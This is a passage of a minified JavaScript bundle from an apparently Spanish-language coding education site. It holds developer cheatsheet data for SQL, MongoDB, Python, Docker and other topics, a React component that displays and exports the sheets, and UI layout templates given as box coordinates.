error)"}]},{name:"Funciones de Ventana",items:[{label:"Ranking",value:"ROW_NUMBER() OVER (PARTITION BY cat ORDER BY price DESC)"},{label:"Rolling",value:"SUM(val) OVER (ORDER BY date) (Suma acumulada)"},{label:"Lead/Lag",value:"LAG(val) o LEAD(val) (Accede a fila anterior/siguiente)"}]},{name:"Utilidades Avanzadas",items:[{label:"Explain",value:"EXPLAIN ANALYZE SELECT ... (Ver plan de ejecucin)"},{label:"Coalesce",value:"COALESCE(val, 0); (Primer valor no nulo)"},{label:"Case",value:'CASE WHEN x=1 THEN "A" ELSE "B" END; (Lgica condicional)'}]}]},R5={id:"nosql",title:"NoSQL (MongoDB)",icon:"",description:"Bases de datos no relacionales, flexibles y escalables basadas en documentos.",sections:[{name:"CRUD & Operaciones",items:[{label:"Insert",value:"db.coll.insertOne({ x: 1 }); db.coll.insertMany([{a:1}, {b:2}]);"},{label:"Find",value:"db.coll.find({ age: { $gte: 21 } }).limit(5).skip(10);"},{label:"Update",value:"db.coll.updateOne({ _id: id }, { $set: { active: true } });"},{label:"Delete",value:'db.coll.deleteOne({ status: "D" }); db.coll.deleteMany({});'}]},{name:"Operadores de Consulta",items:[{label:"Comparacin",value:"$gt (>) , $lt (<) , $gte (>=) , $lte (<=) , $ne (!=) , $in: [1,2]"},{label:"Lgicos",value:"$or: [ {a:1}, {b:2} ], $and, $not, $nor"},{label:"Elementos",value:'$exists: true, $type: "string"'},{label:"Evaluacin",value:'$regex: /pattern/i, $text: { $search: "query" }'}]},{name:"Operadores de Actualizacin",items:[{label:"Campos",value:"$set: {k: v}, $unset: {k: 1}, $inc: {n: 1}, $rename: {o: n}"},{label:"Arrays",value:"$push: {a: v}, $pull: {a: v}, $addToSet: {a: v} (sin dups)"},{label:"Filtros Array",value:'db.coll.updateMany({}, { $set: { "tags.$[el]": 0 } }, { arrayFilters: [...] })'}]},{name:"Aggregation Framework",items:[{label:"Pipeline",value:"db.coll.aggregate([ { $match }, { $group }, { $sort }, { $project } ])"},{label:"Group",value:'$group: { _id: "$cat", avg: { $avg: "$price" }, count: { $sum: 1 } }'},{label:"Lookup",value:'$lookup: { from: "users", localField: "u_id", foreignField: "_id", as: "user" }'},{label:"Unwind",value:'$unwind: "$tags" (aplana arrays en mltiples documentos)'}]},{name:"Modelado & Mongoose",items:[{label:"Connect",value:"mongoose.connect(uri);"},{label:"Schema",value:"new Schema({ name: { type: String, required: true }, age: Number });"},{label:"Middleware",value:'schema.pre("save", function(next) { ... next(); });'},{label:"Populate",value:'Post.find().populate("author"); (como un SQL Join)'}]},{name:"Rendimiento",items:[{label:"Indexes",value:"db.coll.createIndex({ email: 1 }, { unique: true });"},{label:"Explain",value:'db.coll.find().explain("executionStats"); (debug de queries)'}]}]},L5={id:"python",title:"Python",icon:"",description:"Lenguaje verstil para backend, ciencia de datos, IA y scripting.",sections:[{name:"Estructuras de Datos (DS)",items:[{label:"Listas",value:"l = [1, 2]; l.append(3); l.pop(); l.insert(0, val); l.extend([4,5])"},{label:"Slicing",value:"l[start:stop:step]; l[::-1] (invertir); l[1:] (todo menos el 1ro)"},{label:"Diccionarios",value:'d = {"a": 1}; d["b"] = 2; d.get("c", 0); d.keys(); d.items()'},{label:"Tuplas/Sets",value:"t = (1, 2); s = {1, 2, 2} -> {1, 2} (nicos); s.add(3)"}]},{name:"Sintaxis & Control",items:[{label:"Funciones",value:"def fn(arg, opt=0, *args, **kwargs): return val"},{label:"Comprensin",value:"[x**2 for x in range(10) if x % 2 == 0] (List compr.)"},{label:"Lambda",value:"multiply = lambda x, y: x * y; res = multiply(2, 5)"},{label:"Context Mgr",value:'with open("file.txt", "r") as f: content = f.read()'}]},{name:"OOP (Orientacin a Objetos)",items:[{label:"Clase",value:"class MyClass: def __init__(self, val): self.val = val"},{label:"Herencia",value:"class Child(Parent): def __init__(self): super().__init__()"},{label:"Decoradores",value:"@property, @staticmethod, @classmethod, @custom_decorator"},{label:"Dunder methods",value:"__str__ (print), __len__ (len()), __getitem__ (index)"}]},{name:"Manejo de Errores & Tipado",items:[{label:"Exeptions",value:"try: ... except Error as e: ... finally: ..."},{label:"Raise",value:'raise ValueError("Mensaje de error personalizado")'},{label:"Type Hints",value:"def add(a: int, b: int) -> int: return a + b"}]},{name:"Ecosistema & Entorno",items:[{label:"PIP",value:"pip install pkg; pip freeze > reqs.txt; pip install -r reqs.txt"},{label:"Venv",value:"python -m venv .venv; source .venv/bin/activate"},{label:"Importar",value:"import math; from datetime import datetime as dt"}]},{name:"Libreras Populares",items:[{label:"Backend",value:"Django (robusto), Flask (micro), FastAPI (moderno/asinc)"},{label:"Data Science",value:"NumPy (clculo), Pandas (tablas), Matplotlib (grficos)"},{label:"ML/IA",value:"Scikit-learn, TensorFlow, PyTorch, Keras"},{label:"Scripting",value:"Requests (HTTP), Selenium (automatizacin), OS, Sys"}]},{name:"Asincrona (AsyncIO)",items:[{label:"Async/Await",value:'async def main(): await asyncio.sleep(1); print("Hi")'},{label:"Run",value:"asyncio.run(main()); (punto de entrada)"}]}]},I5={id:"testing",title:"Testing (Jest/Vitest)",icon:"",description:"Calidad, robustez y refactorizacin segura.",sections:[{name:"Globals",items:[{label:"Bloques",value:'describe("tema", () => { ... }); it("caso", () => { ... })'},{label:"Expect",value:"expect(resultado).toBe(esperado);"},{label:"Test Only",value:"it.only() o describe.only() (ignora el resto)"}]},{name:"Common Matchers",items:[{label:"Valores",value:"toBe() , toEqual() (objs) , toBeNull() , toBeTruthy()"},{label:"Num/Str",value:"toBeGreaterThan(n) , toMatch(/regex/)"},{label:"Arrays",value:"toContain(item) , toHaveLength(n)"}]},{name:"Asincrona",items:[{label:"Async",value:'it("...", async () => { await expect(...).resolves.toBe() });'}]},{name:"Lifecycle Hooks",items:[{label:"Setup",value:"beforeAll() , beforeEach()"},{label:"Teardown",value:"afterAll() , afterEach()"}]},{name:"Mocks & Spies",items:[{label:"Fn",value:"const myMock = vi.fn() (Vitest) o jest.fn()"},{label:"Module",value:'vi.mock("./api") (simular mdulo completo)'}]}]},D5={id:"docker",title:"Docker",icon:"",description:"Infrastructura como cdigo y despliegue inmutable.",sections:[{name:"Imgenes & Build",items:[{label:"Build",value:"docker build -t name:tag . (crear imagen)"},{label:"Listar",value:"docker images (ver imgenes locales)"},{label:"Borrar",value:"docker rmi <id> (borra imagen)"}]},{name:"Contenedores (Container)",items:[{label:"Run",value:"docker run -d -p 80:80 --name myapp name:tag"},{label:"Listar",value:"docker ps (activos) , docker ps -a (todos)"},{label:"Interactuar",value:"docker exec -it <id> sh (entrar a consola)"},{label:"Stop/Start",value:"docker stop <id> ; docker start <id>"}]},{name:"Docker Compose",items:[{label:"Up/Down",value:"docker-compose up -d ; docker-compose down"},{label:"Build",value:"docker-compose build --no-cache"}]},{name:"Mantenimiento",items:[{label:"Prune",value:"docker system prune -a (limpia todo lo hurfano)"},{label:"Logs",value:"docker logs <id> -f --tail 100"}]}]},w5={id:"clean-code",title:"Clean Code & SOLID",icon:"",description:"Arquitectura, mantenibilidad y calidad de software.",sections:[{name:"Principios Base",items:[{label:"KISS",value:"Keep It Simple, Stupid (No sobre-compliques)"},{label:"YAGNI",value:"You Aint Gonna Need It (No programes lo que no necesitas)"},{label:"DRY",value:"Dont Repeat Yourself (Evita duplicidad lgica)"},{label:"Naming",value:"Usa nombres pronunciables y con intencin."}]},{name:"SOLID (Resumen)",items:[{label:"S - SRP",value:"Una clase/fn debe tener una nica razn para cambiar."},{label:"O - OCP",value:"Abierto para extensin, cerrado para modificacin."},{label:"L - LSP",value:"Subtipos deben ser sustituibles por sus tipos base."},{label:"I - ISP",value:"Muchas interfaces pequeas mejor que una grande."},{label:"D - DIP",value:"Depende de abstracciones, no de detalles."}]}]},M5={id:"regex",title:"RegEx",icon:"",description:"Expresiones regulares para manipulacin de strings.",sections:[{name:"Caracteres Base",items:[{label:"Clases",value:"\\d (digito), \\W (no-letra), \\s (espacio), . (todo)"},{label:"Anclas",value:"^ (inicio), $ (fin), \\b (lmite de palabra)"},{label:"Conjuntos",value:"[a-z], [0-9], [^0-9] (no digito)"}]},{name:"Cuantificadores",items:[{label:"Veces",value:"* (0+), + (1+), ? (0 o 1), {n} (exacto), {n,m} (rango)"}]},{name:"Grupos & Flags",items:[{label:"Grupos",value:"(abc) (captura), (?:abc) (no captura), (a|b) (uno u otro)"},{label:"Flags",value:"g (global), i (insensible mayus), m (multilnea)"}]}]},_5={id:"algo",title:"Algoritmos & DS",icon:"",description:"Estructuras de datos y eficiencia computacional.",sections:[{name:"Big O Complexity",items:[{label:"Constante",value:"O(1) - Acceso por ndice, Hash Maps"},{label:"Lineal",value:"O(n) - Iteracin simple, bsqueda lineal"},{label:"Log",value:"O(log n) - Bsqueda binaria"},{label:"Quad",value:"O(n^2) - Bucles anidados (Bubble Sort)"}]},{name:"ED Lineales",items:[{label:"Stack",value:"LIFO (Last In, First Out). Push/Pop"},{label:"Queue",value:"FIFO (First In, First Out). Enqueue/Dequeue"},{label:"Linked List",value:"Nodos con data y puntero al siguiente."}]},{name:"ED No Lineales",items:[{label:"Hash Table",value:"Pares llave-valor. Acceso rpido O(1)"},{label:"Trees",value:"Binary Tree, BST (Bsqueda binaria), Heaps"},{label:"Graphs",value:"Vrtices y Aristas. BFS y DFS"}]}]},k5={id:"browser-api",title:"Browser APIs",icon:"",description:"Capacidades nativas del navegador para aplicaciones modernas.",sections:[{name:"Almacenamiento",items:[{label:"Local Storage",value:'localStorage.setItem("k", "v"); localStorage.getItem("k");'},{label:"Session Storage",value:"sessionStorage.clear(); (se borra al cerrar pestaa)"},{label:"Cookies",value:'document.cookie = "user=octavio; max-age=3600; path=/";'}]},{name:"Observadores",items:[{label:"Intersection",value:"new IntersectionObserver(entries => { ... }).observe(el);"},{label:"Resize",value:"new ResizeObserver(entries => { ... }).observe(el);"}]},{name:"Red & Media",items:[{label:"Fetch API",value:"fetch(url).then(r => r.json()).catch(e => ...);"},{label:"Navigator",value:"navigator.clipboard; navigator.geolocation.getCurrentPosition();"},{label:"History",value:'history.pushState({}, "", "/new-url"); window.onpopstate = ...'}]}]},N5={id:"auth",title:"Auth & Security",icon:"",description:"Fundamentos de autenticacin, autorizacin y seguridad web.",sections:[{name:"Conceptos",items:[{label:"AuthN",value:"Autenticacin: Quin eres? (Login)"},{label:"AuthZ",value:"Autorizacin: Qu puedes hacer? (Permisos)"},{label:"JWT",value:"JSON Web Token: Header.Payload.Signature"}]},{name:"Estrategias",items:[{label:"Bearer",value:"Authorization: Bearer <token> (en el header)"},{label:"OAuth2",value:"Flujo de terceros (Login con Google/GitHub)"},{label:"Sessions",value:"Estado guardado en servidor con cookie de ID."}]},{name:"Seguridad",items:[{label:"CORS",value:"Cross-Origin Resource Sharing (Control de dominios)"},{label:"Hashing",value:"bcrypt.hash(pass, 10); (Nunca guardes texto plano)"},{label:"XSS/CSRF",value:"Validacin de entrada y tokens anti-falsificacin."}]}]},O5={id:"devops",title:"Deployment & DevOps",icon:"",description:"Ciclo de vida, integracin y despliegue de aplicaciones.",sections:[{name:"CI/CD Basics",items:[{label:"Github Actions",value:".github/workflows/main.yml (automatizacin)"},{label:"Stages",value:"Lint -> Test -> Build -> Deploy"}]},{name:"Servicios",items:[{label:"Static",value:"Vercel, Netlify, GitHub Pages (Frontend)"},{label:"Cloud",value:"AWS (S3, EC2), Google Cloud, Azure"},{label:"PaaS",value:"Railway, Render, Fly.io"}]},{name:"Dominio & DNS",items:[{label:"Records",value:"A (IP), CNAME (Alias), MX (Email), TXT (Verificacin)"},{label:"SSL",value:"HTTPS (Let's Encrypt) - Encriptacin de trfico."}]}]},lp=[g5,b5,v5,y5,E5,S5,C5,A5,T5,x5,j5,P5,q5,R5,L5,I5,D5,w5,M5,_5,k5,N5,O5],z5=()=>{const[a,e]=F.useState(""),[t,o]=F.useState(lp[0].id),r=lp.filter(p=>p.title.toLowerCase().includes(a.toLowerCase())||p.description.toLowerCase().includes(a.toLowerCase())),l=lp.find(p=>p.id===t)||lp[0],c=p=>{navigator.clipboard.writeText(p)},d=p=>p.split(/(:|=>|\s-\s)/).map((y,S)=>S===0?g.jsx("span",{className:"code-key",children:y},S):y===":"||y==="=>"||y===" - "?g.jsx("span",{className:"code-operator",children:y},S):g.jsx("span",{className:"code-value",children:y},S)),f=()=>{let p=`#  PROGRAVIO - ${l.title} Cheatsheet

`;p+=`> ${l.description}

`,l.sections.forEach(A=>{p+=`### ${A.name}
`,A.items.forEach(R=>{p+=`- **${R.label}**: \`${R.value}\`
`}),p+=`
`}),p+=`---
*Generado por Progravio*`;const v=new Blob([p],{type:"text/markdown"}),y=URL.createObjectURL(v),S=document.createElement("a");S.href=y,S.download=`Progravio_${l.id}_Cheatsheet.md`,document.body.appendChild(S),S.click(),document.body.removeChild(S),URL.revokeObjectURL(y)};return g.jsxs("div",{className:"cheatsheets-container animate-fade-in",children:[g.jsxs("header",{className:"cheatsheets-header",children:[g.jsx("h1",{children:"Hojas de Trucos (Cheatsheets)"}),g.jsx("p",{children:"Hojas de referencia rpida para refrescar conceptos, comandos y sintaxis de los mdulos ms importantes del desarrollo. Ideales para tener a mano mientras programas."}),g.jsxs("div",{className:"header-actions",children:[g.jsx("div",{className:"search-wrapper glass-effect",children:g.jsx("input",{type:"text",placeholder:"Buscar tecnologa o concepto...",value:a,onChange:p=>e(p.target.value),className:"cs-search-input"})}),g.jsx("button",{onClick:f,className:"export-btn glass-effect",title:"Descargar esta hoja como archivo Markdown (.md)",children:" Exportar .MD"}),g.jsx("button",{onClick:()=>window.print(),className:"export-btn glass-effect",title:"Descargar como PDF",children:" PDF"})]})]}),g.jsxs("div",{className:"cs-layout",children:[g.jsxs("aside",{className:"cs-sidebar glass-effect",children:[g.jsx("h3",{children:"Mdulos"}),g.jsx("div",{className:"cs-tabs",children:r.map(p=>g.jsxs("button",{className:`cs-tab ${t===p.id?"active":""}`,onClick:()=>o(p.id),children:[g.jsx("span",{className:"cs-tab-icon",children:p.icon}),g.jsx("span",{className:"cs-tab-title",children:p.title})]},p.id))})]}),g.jsxs("main",{className:"cs-main-content",children:[g.jsx("div",{className:"cs-sheet-info",children:g.jsxs("div",{className:"cs-sheet-title-row",children:[g.jsx("span",{className:"cs-large-icon",children:l.icon}),g.jsxs("div",{children:[g.jsxs("h2",{children:[l.title," Cheat Sheet"]}),g.jsx("p",{children:l.description})]})]})}),g.jsx("div",{className:"cs-sections-grid",children:l.sections.map((p,v)=>g.jsxs("div",{className:"cs-section-card glass-effect",children:[g.jsx("h3",{children:p.name}),g.jsx("div",{className:"cs-items-list",children:p.items.map((y,S)=>g.jsxs("div",{className:"cs-item group",children:[g.jsx("span",{className:"cs-item-label",children:y.label}),g.jsxs("div",{className:"cs-code-wrapper",children:[g.jsx("code",{className:"cs-item-code",children:d(y.value)}),g.jsx("button",{className:"copy-btn",onClick:()=>c(y.value),title:"Copiar",children:""})]})]},v+"-"+S))})]},v))})]})]}),g.jsxs("section",{className:"cs-contribute-banner glass-effect",children:[g.jsx("h3",{children:"Falta algo?"}),g.jsx("p",{children:"Nuestra comunidad actualiza estas hojas constantemente. Si tienes un truco o comando til, comprtelo en nuestro Discord."}),g.jsx("button",{className:"btn-primary",children:"Sugerir Mejora"})]})]})},ug=["#10b981","#34d399","#059669","#2dd4bf","#0f766e","#10b981","#818cf8","#6366f1","#a78bfa","#d946ef","#fbbf24","#f59e0b","#ef4444","#f43f5e","#ec4899","#64748b","#94a3b8","#cbd5e1","#475569","#1e293b"],U5=[{name:"Navbar",icon:"",boxes:[{x:30,y:30,width:1140,height:90,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Navbar"},{x:45,y:45,width:150,height:60,bgColor:"#10b981",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Logo"},{x:645,y:52,width:120,height:45,bgColor:"#334155",borderRadius:6,opacity:1,rotation:0,zIndex:2,label:"Link 1"},{x:780,y:52,width:120,height:45,bgColor:"#334155",borderRadius:6,opacity:1,rotation:0,zIndex:2,label:"Link 2"},{x:915,y:52,width:120,height:45,bgColor:"#334155",borderRadius:6,opacity:1,rotation:0,zIndex:2,label:"Link 3"},{x:1050,y:52,width:105,height:45,bgColor:"#818cf8",borderRadius:6,opacity:1,rotation:0,zIndex:2,label:"CTA"}]},{name:"Grilla de Tarjetas",icon:"",boxes:[{x:30,y:30,width:345,height:420,bgColor:"#1e293b",borderRadius:16,opacity:1,rotation:0,zIndex:1,label:"Card 1"},{x:60,y:60,width:285,height:180,bgColor:"#334155",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"Image"},{x:420,y:30,width:345,height:420,bgColor:"#1e293b",borderRadius:16,opacity:1,rotation:0,zIndex:1,label:"Card 2"},{x:450,y:60,width:285,height:180,bgColor:"#334155",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"Image"},{x:810,y:30,width:345,height:420,bgColor:"#1e293b",borderRadius:16,opacity:1,rotation:0,zIndex:1,label:"Card 3"},{x:840,y:60,width:285,height:180,bgColor:"#334155",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"Image"}]},{name:"Santo Grial",icon:"",boxes:[{x:30,y:15,width:1140,height:75,bgColor:"#10b981",borderRadius:8,opacity:1,rotation:0,zIndex:1,label:"Header"},{x:30,y:105,width:225,height:480,bgColor:"#818cf8",borderRadius:8,opacity:1,rotation:0,zIndex:1,label:"Sidebar"},{x:270,y:105,width:660,height:480,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:1,label:"Main Content"},{x:945,y:105,width:225,height:480,bgColor:"#a78bfa",borderRadius:8,opacity:1,rotation:0,zIndex:1,label:"Aside"},{x:30,y:600,width:1140,height:75,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:1,label:"Footer"}]},{name:"Seccin Hero",icon:"",boxes:[{x:30,y:30,width:1140,height:600,bgColor:"#0f172a",borderRadius:20,opacity:1,rotation:0,zIndex:1,label:"Hero BG"},{x:90,y:150,width:525,height:75,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Ttulo H1"},{x:90,y:255,width:450,height:45,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Subttulo"},{x:90,y:345,width:210,height:72,bgColor:"#10b981",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"CTA Button"},{x:330,y:345,width:210,height:72,bgColor:"#334155",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"Secondary"},{x:720,y:90,width:420,height:510,bgColor:"#1e293b",borderRadius:16,opacity:.8,rotation:0,zIndex:2,label:"Ilustracin"}]},{name:"Dashboard",icon:"",boxes:[{x:30,y:15,width:225,height:660,bgColor:"#0f172a",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Sidebar"},{x:277,y:15,width:892,height:90,bgColor:"#1e293b",borderRadius:10,opacity:1,rotation:0,zIndex:1,label:"Topbar"},{x:277,y:120,width:285,height:150,bgColor:"#10b981",borderRadius:12,opacity:.9,rotation:0,zIndex:1,label:"Stat 1"},{x:577,y:120,width:285,height:150,bgColor:"#818cf8",borderRadius:12,opacity:.9,rotation:0,zIndex:1,label:"Stat 2"},{x:877,y:120,width:292,height:150,bgColor:"#34d399",borderRadius:12,opacity:.9,rotation:0,zIndex:1,label:"Stat 3"},{x:277,y:292,width:592,height:382,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Chart"},{x:885,y:292,width:285,height:382,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Activity"}]},{name:"Formulario Login",icon:"",boxes:[{x:300,y:60,width:600,height:570,bgColor:"#1e293b",borderRadius:20,opacity:1,rotation:0,zIndex:1,label:"Card"},{x:390,y:105,width:420,height:75,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Ttulo"},{x:390,y:210,width:420,height:66,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Input Email"},{x:390,y:300,width:420,height:66,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Input Pass"},{x:390,y:405,width:420,height:72,bgColor:"#10b981",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"Iniciar Sesin"},{x:390,y:510,width:420,height:45,bgColor:"transparent",borderRadius:0,opacity:.6,rotation:0,zIndex:2,label:"No tens cuenta"}]},{name:"Precios",icon:"",boxes:[{x:30,y:30,width:345,height:630,bgColor:"#1e293b",borderRadius:16,opacity:1,rotation:0,zIndex:1,label:"Plan Free"},{x:60,y:60,width:285,height:45,bgColor:"transparent",borderRadius:0,opacity:.7,rotation:0,zIndex:2,label:"Free Title"},{x:60,y:120,width:285,height:75,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Price 0"},{x:60,y:525,width:285,height:66,bgColor:"#334155",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"Select Free"},{x:420,y:15,width:360,height:660,bgColor:"#10b981",borderRadius:16,opacity:1,rotation:0,zIndex:1,label:"Plan Pro"},{x:450,y:45,width:300,height:45,bgColor:"transparent",borderRadius:0,opacity:.9,rotation:0,zIndex:2,label:"Pro Title"},{x:450,y:105,width:300,height:75,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Price 29"},{x:450,y:540,width:300,height:66,bgColor:"#0c4a6e",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"Select Pro"},{x:825,y:30,width:345,height:630,bgColor:"#1e293b",borderRadius:16,opacity:1,rotation:0,zIndex:1,label:"Plan Enterprise"},{x:855,y:60,width:285,height:45,bgColor:"transparent",borderRadius:0,opacity:.7,rotation:0,zIndex:2,label:"Enterprise Title"},{x:855,y:120,width:285,height:75,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Price Custom"},{x:855,y:525,width:285,height:66,bgColor:"#334155",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"Contact Sales"}]},{name:"Pie de Pgina",icon:"",boxes:[{x:30,y:30,width:1140,height:390,bgColor:"#0f172a",borderRadius:14,opacity:1,rotation:0,zIndex:1,label:"Footer BG"},{x:60,y:60,width:210,height:45,bgColor:"#10b981",borderRadius:6,opacity:1,rotation:0,zIndex:2,label:"Logo"},{x:60,y:135,width:210,height:180,bgColor:"transparent",borderRadius:0,opacity:.6,rotation:0,zIndex:2,label:"Descripcin"},{x:360,y:60,width:180,height:30,bgColor:"transparent",borderRadius:0,opacity:.8,rotation:0,zIndex:2,label:"Producto"},{x:360,y:105,width:150,height:22,bgColor:"transparent",borderRadius:0,opacity:.5,rotation:0,zIndex:2,label:"Features"},{x:360,y:142,width:150,height:22,bgColor:"transparent",borderRadius:0,opacity:.5,rotation:0,zIndex:2,label:"Pricing"},{x:600,y:60,width:180,height:30,bgColor:"transparent",borderRadius:0,opacity:.8,rotation:0,zIndex:2,label:"Compaa"},{x:600,y:105,width:150,height:22,bgColor:"transparent",borderRadius:0,opacity:.5,rotation:0,zIndex:2,label:"About"},{x:600,y:142,width:150,height:22,bgColor:"transparent",borderRadius:0,opacity:.5,rotation:0,zIndex:2,label:"Contact"},{x:870,y:60,width:180,height:30,bgColor:"transparent",borderRadius:0,opacity:.8,rotation:0,zIndex:2,label:"Redes"},{x:870,y:105,width:45,height:45,bgColor:"#334155",borderRadius:50,opacity:1,rotation:0,zIndex:2,label:"TW"},{x:930,y:105,width:45,height:45,bgColor:"#334155",borderRadius:50,opacity:1,rotation:0,zIndex:2,label:"GH"},{x:990,y:105,width:45,height:45,bgColor:"#334155",borderRadius:50,opacity:1,rotation:0,zIndex:2,label:"LI"},{x:60,y:360,width:1080,height:2,bgColor:"#334155",borderRadius:0,opacity:.5,rotation:0,zIndex:2,label:"Divider"},{x:60,y:378,width:300,height:22,bgColor:"transparent",borderRadius:0,opacity:.4,rotation:0,zIndex:2,label:"Copyright"}]},{name:"E-Commerce",icon:"",boxes:[{x:30,y:15,width:1140,height:75,bgColor:"#0f172a",borderRadius:10,opacity:1,rotation:0,zIndex:1,label:"Navbar"},{x:30,y:105,width:270,height:570,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Filters"},{x:315,y:105,width:270,height:360,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Product 1"},{x:330,y:120,width:240,height:195,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Img 1"},{x:600,y:105,width:270,height:360,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Product 2"},{x:615,y:120,width:240,height:195,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Img 2"},{x:885,y:105,width:270,height:360,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Product 3"},{x:900,y:120,width:240,height:195,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Img 3"},{x:315,y:480,width:270,height:195,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Product 4"},{x:600,y:480,width:270,height:195,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Product 5"},{x:885,y:480,width:270,height:195,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Product 6"}]},{name:"Artculo de Blog",icon:"",boxes:[{x:150,y:15,width:900,height:300,bgColor:"#334155",borderRadius:16,opacity:1,rotation:0,zIndex:1,label:"Cover Image"},{x:150,y:337,width:900,height:60,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:1,label:"Blog Title"},{x:150,y:412,width:450,height:30,bgColor:"transparent",borderRadius:0,opacity:.5,rotation:0,zIndex:1,label:"Author Date"},{x:150,y:465,width:900,height:22,bgColor:"transparent",borderRadius:0,opacity:.6,rotation:0,zIndex:1,label:"Text Line 1"},{x:150,y:502,width:870,height:22,bgColor:"transparent",borderRadius:0,opacity:.6,rotation:0,zIndex:1,label:"Text Line 2"},{x:150,y:540,width:885,height:22,bgColor:"transparent",borderRadius:0,opacity:.6,rotation:0,zIndex:1,label:"Text Line 3"},{x:150,y:592,width:600,height:22,bgColor:"transparent",borderRadius:0,opacity:.6,rotation:0,zIndex:1,label:"Text Line 4"},{x:150,y:645,width:180,height:45,bgColor:"#10b981",borderRadius:6,opacity:1,rotation:0,zIndex:1,label:"Read More"}]},{name:"App de Chat",icon:"",boxes:[{x:30,y:15,width:330,height:660,bgColor:"#0f172a",borderRadius:14,opacity:1,rotation:0,zIndex:1,label:"Contacts Panel"},{x:45,y:30,width:300,height:66,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Search"},{x:45,y:111,width:300,height:75,bgColor:"#10b981",borderRadius:8,opacity:.2,rotation:0,zIndex:2,label:"Contact Active"},{x:45,y:195,width:300,height:75,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Contact 2"},{x:45,y:279,width:300,height:75,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Contact 3"},{x:375,y:15,width:795,height:75,bgColor:"#1e293b",borderRadius:10,opacity:1,rotation:0,zIndex:1,label:"Chat Header"},{x:390,y:112,width:300,height:60,bgColor:"#334155",borderRadius:12,opacity:1,rotation:0,zIndex:2,label:"Msg Received"},{x:780,y:195,width:375,height:60,bgColor:"#10b981",borderRadius:12,opacity:.8,rotation:0,zIndex:2,label:"Msg Sent"},{x:390,y:277,width:420,height:60,bgColor:"#334155",borderRadius:12,opacity:1,rotation:0,zIndex:2,label:"Msg Received 2"},{x:825,y:360,width:330,height:60,bgColor:"#10b981",borderRadius:12,opacity:.8,rotation:0,zIndex:2,label:"Msg Sent 2"},{x:375,y:600,width:795,height:75,bgColor:"#1e293b",borderRadius:10,opacity:1,rotation:0,zIndex:1,label:"Input Bar"},{x:390,y:615,width:660,height:48,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Type Message"},{x:1065,y:615,width:90,height:48,bgColor:"#10b981",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Send"}]},{name:"Pgina de Perfil",icon:"",boxes:[{x:225,y:15,width:750,height:240,bgColor:"#1e293b",borderRadius:16,opacity:1,rotation:0,zIndex:1,label:"Cover"},{x:510,y:150,width:180,height:180,bgColor:"#10b981",borderRadius:100,opacity:1,rotation:0,zIndex:2,label:"Avatar"},{x:450,y:352,width:300,height:45,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:1,label:"Username"},{x:465,y:405,width:270,height:22,bgColor:"transparent",borderRadius:0,opacity:.5,rotation:0,zIndex:1,label:"Bio Line"},{x:375,y:465,width:150,height:54,bgColor:"#10b981",borderRadius:8,opacity:1,rotation:0,zIndex:1,label:"Follow"},{x:540,y:465,width:150,height:54,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:1,label:"Message"},{x:705,y:465,width:120,height:54,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:1,label:"More"},{x:225,y:555,width:240,height:150,bgColor:"#1e293b",borderRadius:10,opacity:1,rotation:0,zIndex:1,label:"Post 1"},{x:480,y:555,width:240,height:150,bgColor:"#1e293b",borderRadius:10,opacity:1,rotation:0,zIndex:1,label:"Post 2"},{x:735,y:555,width:240,height:150,bgColor:"#1e293b",borderRadius:10,opacity:1,rotation:0,zIndex:1,label:"Post 3"}]},{name:"App Mvil",icon:"",boxes:[{x:390,y:15,width:420,height:690,bgColor:"#0f172a",borderRadius:30,opacity:1,rotation:0,zIndex:1,label:"Phone 